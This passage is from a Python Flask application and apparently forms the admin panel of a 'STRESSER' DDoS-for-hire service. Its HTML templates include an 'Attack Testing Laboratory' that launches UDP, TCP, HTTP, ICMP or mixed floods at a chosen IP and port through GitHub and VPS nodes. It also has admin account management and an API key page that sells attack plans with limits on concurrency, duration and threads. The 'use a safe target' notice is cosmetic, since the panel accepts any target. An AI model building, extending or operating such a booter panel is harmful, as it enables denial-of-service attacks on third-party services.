.btn-danger{background:linear-gradient(90deg,#ff3366,#ff6680);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#fff;}
.btn-warning{background:linear-gradient(90deg,#ffaa00,#ffcc33);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;}
input,select{background:rgba(0,0,0,0.5);border:1px solid #2a3a5a;border-radius:40px;padding:12px 20px;color:white;width:100%;}
.status-badge{padding:4px 10px;border-radius:40px;font-size:12px;font-weight:600;}
.status-success{background:rgba(0,204,136,0.2);color:#00cc88;border:1px solid #00cc88;}
.status-failed{background:rgba(255,51,102,0.2);color:#ff3366;border:1px solid #ff3366;}
.status-running{background:rgba(255,170,0,0.2);color:#ffaa00;border:1px solid #ffaa00;}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
.fade-in{animation:fadeIn 0.5s;}
</style></head>
<body><div class="container">
<div class="d-flex justify-content-between align-items-center mb-4"><h2><i class="fas fa-flask me-2" style="color:var(--neon);"></i>Attack Testing Laboratory</h2><a href="/admin/dashboard" class="btn btn-outline-light"><i class="fas fa-arrow-left"></i> Back</a></div>

<!-- Quick Test Panel -->
<div class="glass-card"><h4><i class="fas fa-bolt me-2"></i>Quick Test Configuration</h4>
<p class="text-warning"><i class="fas fa-exclamation-triangle me-1"></i> Use a safe target (e.g., 127.0.0.1 or a test server).</p>
<form method="POST" id="testForm">
    <div class="row g-3">
        <div class="col-md-3"><label class="form-label">Target IP</label><input type="text" name="target" class="form-control bg-dark text-white" placeholder="192.168.1.1" required></div>
        <div class="col-md-2"><label class="form-label">Port</label><input type="number" name="port" class="form-control bg-dark text-white" placeholder="443" required></div>
        <div class="col-md-2"><label class="form-label">Duration (max 30s)</label><input type="number" name="duration" class="form-control bg-dark text-white" value="10" min="1" max="30"></div>
        <div class="col-md-2"><label class="form-label">Method</label>
            <select name="method" class="form-select bg-dark text-white">
                <option value="udp">🔥 UDP</option><option value="tcp">🌐 TCP</option><option value="http">💻 HTTP</option><option value="icmp">📡 ICMP</option><option value="mixed">⚡ MIXED</option>
            </select>
        </div>
        <div class="col-md-2"><label class="form-label">Threads</label><input type="number" name="threads" class="form-control bg-dark text-white" value="500"></div>
        <div class="col-md-1 d-flex align-items-end"><button type="submit" class="btn-neon w-100"><i class="fas fa-play"></i> Test All</button></div>
    </div>
</form>
</div>

<!-- Individual Node Testing -->
<div class="glass-card"><h4><i class="fas fa-server me-2"></i>Test Individual Nodes</h4>
<div id="nodeListContainer"><div class="text-center text-muted">Loading nodes...</div></div>
</div>

<!-- Results Panel (appears after test) -->
{% if results %}
<div class="glass-card fade-in"><h4><i class="fas fa-clipboard-list me-2"></i>Test Results</h4>
<p><strong>Target:</strong> {{ target }}:{{ port }} | <strong>Duration:</strong> {{ duration }}s | <strong>Method:</strong> {{ method }} | <strong>Threads:</strong> {{ threads }}</p>
<div class="table-responsive"><table class="table table-dark table-hover">
    <thead><tr><th>Node</th><th>Type</th><th>Status</th><th>Details</th></tr></thead>
    <tbody>{% for r in results %}<tr><td>{{ r.name }}</td><td>{{ r.type }}</td><td><span class="status-badge {% if 'Success' in r.status %}status-success{% else %}status-failed{% endif %}">{{ r.status }}</span></td><td><small>{{ r.details or '' }}</small></td></tr>{% endfor %}</tbody>
</table></div>
<div class="alert alert-info mt-3"><strong>Summary:</strong> GitHub: {{ github_success }}/{{ github_total }} | VPS: {{ vps_success }}/{{ vps_total }}</div>
</div>
{% endif %}
</div>

<script>
// Load nodes for individual testing
async function loadNodes() {
    try {
        const res = await fetch('/admin/nodes/status/all');
        const nodes = await res.json();
        const container = document.getElementById('nodeListContainer');
        if (nodes.length === 0) {
            container.innerHTML = '<div class="text-muted">No nodes available.</div>';
            return;
        }
        let html = '<div class="row g-3">';
        nodes.forEach(node => {
            const statusColor = node.status === 'active' ? 'status-success' : (node.status === 'no_binary' ? 'status-running' : 'status-failed');
            html += `<div class="col-md-4"><div class="bg-dark p-3 rounded-3">
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <strong>${node.name}</strong><span class="status-badge ${statusColor}">${node.status}</span>
                </div>
                <p class="small mb-2"><i class="fas fa-${node.type === 'github' ? 'code-branch' : 'server'}"></i> ${node.type.toUpperCase()} | Attacks: ${node.attack_count}</p>
                <button class="btn btn-sm btn-outline-info w-100" onclick="testSingleNode('${node.id}', '${node.name}')"><i class="fas fa-flask"></i> Test This Node</button>
            </div></div>`;
        });
        html += '</div>';
        container.innerHTML = html;
    } catch(e) {
        console.error(e);
    }
}

// Test a single node
async function testSingleNode(nodeId, nodeName) {
    if (!confirm(`Test attack on ${nodeName}? Use default test target (127.0.0.1:443, 10s, UDP, 500 threads).`)) return;
    
    // Show loading
    const btn = event.target;
    const originalText = btn.innerHTML;
    btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Testing...';
    btn.disabled = true;
    
    try {
        // Quick test with predefined safe parameters
        const formData = new FormData();
        formData.append('target', '127.0.0.1');
        formData.append('port', '443');
        formData.append('duration', '5');
        formData.append('method', 'udp');
        formData.append('threads', '500');
        formData.append('single_node', nodeId);
        
        const res = await fetch('/admin/test-attack/single', { method: 'POST', body: formData });
        const data = await res.json();
        alert(`Test on ${nodeName}: ${data.status} - ${data.message}`);
    } catch(e) {
        alert('Test failed');
    } finally {
        btn.innerHTML = originalText;
        btn.disabled = false;
    }
}

// Load nodes on page load
document.addEventListener('DOMContentLoaded', loadNodes);
</script>
</body></html>
'''

ADMIN_MANAGE_HTML = '''
<!DOCTYPE html>
<html><head><title>Manage Admins • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
    body { background: #0a0a1a; color: #fff; padding: 20px; }
    .glass-card { background: rgba(15,25,45,0.45); border-radius: 24px; padding: 20px; margin-bottom: 20px; }
    .btn-neon { background: linear-gradient(90deg,#00b377,#00cc88); border: none; border-radius: 40px; padding: 8px 20px; font-weight: bold; color: #000; }
    .btn-danger { background: #ff3355; border: none; color: #fff; }
    .btn-warning { background: #ffaa00; color: #000; }
    label { color: #ccd6f0; font-weight: 500; }
    .form-control, .form-select { background: rgba(0,0,0,0.5) !important; border: 1px solid #2a3a5a !important; color: white !important; }
    .form-control::placeholder { color: #8899aa !important; opacity: 0.7; }
    .form-check-label { color: #ccd6f0; }
    .card-header { color: #fff; font-weight: 600; }
    small { color: #8899aa !important; }
    .text-muted { color: #a0b3cc !important; opacity: 0.9; }
    .modal-content { background: #0a0a1a; color: #fff; }
    .table { color: #fff; }
    .btn-close { filter: invert(1); }
</style>
</head>
<body><div class="container">
<div class="glass-card"><h2><i class="fas fa-user-shield me-2"></i>Manage Administrators</h2>
<a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>

<!-- Add New Admin -->
<div class="card bg-dark mb-4">
  <div class="card-header">➕ Create New Admin</div>
  <div class="card-body">
    <form method="POST" action="/admin/manage/add">
      <div class="row">
        <div class="col-md-4">
          <label class="form-label">Username</label>
          <input type="text" name="username" class="form-control" placeholder="Enter username" required>
        </div>
        <div class="col-md-4">
          <label class="form-label">Password</label>
          <input type="password" name="password" class="form-control" placeholder="Enter password" required>
        </div>
        <div class="col-md-4 d-flex align-items-end">
          <div class="form-check me-3 mb-2">
            <input type="checkbox" name="is_super" class="form-check-input" id="superCheck">
            <label class="form-check-label" for="superCheck">Super Admin</label>
          </div>
          <button type="submit" class="btn-neon">Create Admin</button>
        </div>
      </div>
      <div class="mt-3">
        <label class="form-label">Permissions:</label>
        <div class="row">
          <div class="col-md-2"><div class="form-check"><input type="checkbox" name="permissions" value="dashboard" class="form-check-input" id="perm_dashboard"><label class="form-check-label" for="perm_dashboard"> Dashboard</label></div></div>
          <div class="col-md-2"><div class="form-check"><input type="checkbox" name="permissions" value="nodes" class="form-check-input" id="perm_nodes"><label class="form-check-label" for="perm_nodes"> Nodes</label></div></div>
          <div class="col-md-2"><div class="form-check"><input type="checkbox" name="permissions" value="keys" class="form-check-input" id="perm_keys"><label class="form-check-label" for="perm_keys"> Keys</label></div></div>
          <div class="col-md-2"><div class="form-check"><input type="checkbox" name="permissions" value="settings" class="form-check-input" id="perm_settings"><label class="form-check-label" for="perm_settings"> Settings</label></div></div>
          <div class="col-md-2"><div class="form-check"><input type="checkbox" name="permissions" value="test_attack" class="form-check-input" id="perm_test"><label class="form-check-label" for="perm_test"> Test Attack</label></div></div>
          <div class="col-md-2"><div class="form-check"><input type="checkbox" name="permissions" value="manage_admins" class="form-check-input" id="perm_manage"><label class="form-check-label" for="perm_manage"> Manage Admins</label></div></div>
        </div>
        <small class="text-muted">Super Admins have all permissions automatically.</small>
      </div>
    </form>
  </div>
</div>

<!-- Existing Admins -->
<h4>Existing Administrators</h4>
<table class="table table-dark">
  <thead><tr><th>Username</th><th>Super Admin</th><th>Permissions</th><th>Created</th><th>Actions</th></tr></thead>
  <tbody>
  {% for admin in admins %}
  <tr>
    <td>{{ admin.username }}</td>
    <td>{% if admin.is_super %}👑 Yes{% else %}❌ No{% endif %}</td>
    <td>{{ admin.permissions|join(', ') if admin.permissions else 'None' }}</td>
    <td>{{ admin.created_at.strftime('%Y-%m-%d') if admin.created_at else 'N/A' }}</td>
    <td>
      <button class="btn btn-sm btn-warning" data-bs-toggle="modal" data-bs-target="#editModal{{ loop.index }}">Edit</button>
      <form method="POST" action="/admin/manage/delete/{{ admin._id if USE_MONGO else admin.id }}" style="display:inline" onsubmit="return confirm('Delete this admin?');">
        <button class="btn btn-sm btn-danger">Delete</button>
      </form>
    </td>
  </tr>
  <!-- Edit Modal -->
  <div class="modal fade" id="editModal{{ loop.index }}" tabindex="-1">
    <div class="modal-dialog"><div class="modal-content bg-dark text-white">
      <form method="POST" action="/admin/manage/edit/{{ admin._id if USE_MONGO else admin.id }}">
      <div class="modal-header"><h5>Edit {{ admin.username }}</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
      <div class="modal-body">
        <div class="form-check mb-3"><input type="checkbox" name="is_super" class="form-check-input" {% if admin.is_super %}checked{% endif %}><label class="form-check-label">Super Admin</label></div>
        <label class="form-label">Permissions:</label>
        <div class="row">
          <div class="col-6"><div class="form-check"><input type="checkbox" name="permissions" value="dashboard" class="form-check-input" {% if 'dashboard' in admin.permissions %}checked{% endif %}> <label class="form-check-label">Dashboard</label></div></div>
          <div class="col-6"><div class="form-check"><input type="checkbox" name="permissions" value="nodes" class="form-check-input" {% if 'nodes' in admin.permissions %}checked{% endif %}> <label class="form-check-label">Nodes</label></div></div>
          <div class="col-6"><div class="form-check"><input type="checkbox" name="permissions" value="keys" class="form-check-input" {% if 'keys' in admin.permissions %}checked{% endif %}> <label class="form-check-label">Keys</label></div></div>
          <div class="col-6"><div class="form-check"><input type="checkbox" name="permissions" value="settings" class="form-check-input" {% if 'settings' in admin.permissions %}checked{% endif %}> <label class="form-check-label">Settings</label></div></div>
          <div class="col-6"><div class="form-check"><input type="checkbox" name="permissions" value="test_attack" class="form-check-input" {% if 'test_attack' in admin.permissions %}checked{% endif %}> <label class="form-check-label">Test Attack</label></div></div>
          <div class="col-6"><div class="form-check"><input type="checkbox" name="permissions" value="manage_admins" class="form-check-input" {% if 'manage_admins' in admin.permissions %}checked{% endif %}> <label class="form-check-label">Manage Admins</label></div></div>
        </div>
      </div>
      <div class="modal-footer"><button type="submit" class="btn-neon">Save</button></div>
      </form>
    </div></div>
  </div>
  {% endfor %}
  </tbody>
</table>
</div></div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body></html>
'''

ADMIN_API_KEYS_HTML = '''
<!DOCTYPE html>
<html><head><title>API Keys • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
    body { background: #0a0a1a; color: #fff; padding: 20px; }
    .glass-card { background: rgba(15,25,45,0.45); border-radius: 24px; padding: 20px; margin-bottom: 20px; }
    label { color: #ccd6f0; }
    .form-control, .form-select { background: rgba(0,0,0,0.5)!important; border: 1px solid #2a3a5a!important; color: #fff!important; }
    .btn-neon { background: linear-gradient(90deg,#00b377,#00cc88); border: none; border-radius: 40px; padding: 8px 20px; font-weight: bold; color: #000; }
    .text-muted { color: #a0b3cc !important; }
</style>
</head>
<body><div class="container">
<div class="glass-card"><h2><i class="fas fa-key me-2"></i>API Key Management</h2>
<a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>

<div class="card bg-dark mb-4"><div class="card-header">➕ Create New API Key</div><div class="card-body">
<form method="POST" action="/admin/api_keys/create">
  <div class="row">
    <div class="col-md-3"><label>User ID</label><input type="text" name="user_id" class="form-control" placeholder="User ID" required></div>
    <div class="col-md-3"><label>Key Name</label><input type="text" name="name" class="form-control" placeholder="My Bot" value="API Key"></div>
    <div class="col-md-2"><label>Plan</label>
      <select name="plan_name" class="form-select" id="planSelect" onchange="toggleCustom(this.value)">
        <option value="">-- Select Plan --</option>
        {% for p in plans %}<option value="{{ p.name }}">{{ p.name }}</option>{% endfor %}
        <option value="custom">Custom</option>
      </select>
    </div>
    <div class="col-md-2"><label>Expires (days)</label><input type="number" name="expires_days" class="form-control" placeholder="Never"></div>
  </div>
  <div class="row mt-2" id="customLimits" style="display:none;">
    <div class="col-md-3"><label>Max Concurrent</label><input type="number" name="custom_concurrent" class="form-control" placeholder="e.g., 5"></div>
    <div class="col-md-3"><label>Max Duration (s)</label><input type="number" name="custom_duration" class="form-control" placeholder="e.g., 300"></div>
    <div class="col-md-3"><label>Max Threads</label><input type="number" name="custom_threads" class="form-control" placeholder="e.g., 5000"></div>
  </div>
  <button type="submit" class="btn-neon mt-3">Generate API Key</button>
</form></div></div>

<h4>Existing API Keys</h4>
<div class="table-responsive"><table class="table table-dark">
<thead><tr><th>Name</th><th>User</th><th>Key</th><th>Plan/Limits</th><th>Active</th><th>Attacks</th><th>Last Used</th><th>Expires</th><th>Actions</th></tr></thead>
<tbody>
{% for k in keys %}
<tr>
  <td>{{ k.name }}</td>
  <td>{{ user_map[k.user_id] }}</td>
  <td><code>{{ k.key[:12] }}...</code> <button class="btn btn-sm btn-outline-info" onclick="copyKey('{{ k.key }}')"><i class="fas fa-copy"></i></button></td>
  <td>{% if k.plan_name %}{{ k.plan_name }}{% elif k.max_concurrent %}Custom{% else %}User Plan{% endif %}</td>
  <td>{% if k.active %}✅{% else %}❌{% endif %}</td>
  <td>{{ k.total_attacks }}</td>
  <td>{{ k.last_used.strftime('%Y-%m-%d') if k.last_used else 'Never' }}</td>
  <td>{{ k.expires_at.strftime('%Y-%m-%d') if k.expires_at else 'Never' }}</td>
  <td>
    <form method="POST" action="/admin/api_keys/{{ k._id if USE_MONGO else k.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form>
    <form method="POST" action="/admin/api_keys/{{ k._id if USE_MONGO else k.id }}/delete" style="display:inline" onsubmit="return confirm('Delete?')"><button class="btn btn-sm btn-danger">Delete</button></form>
  </td>
</tr>
{% endfor %}
</tbody></table></div>
</div></div>
<script>
function toggleCustom(val) { document.getElementById('customLimits').style.display = val === 'custom' ? 'flex' : 'none'; }
function copyKey(key) { navigator.clipboard.writeText(key); alert('Key copied!'); }
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body></html>
'''

# ==================== RUN ====================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)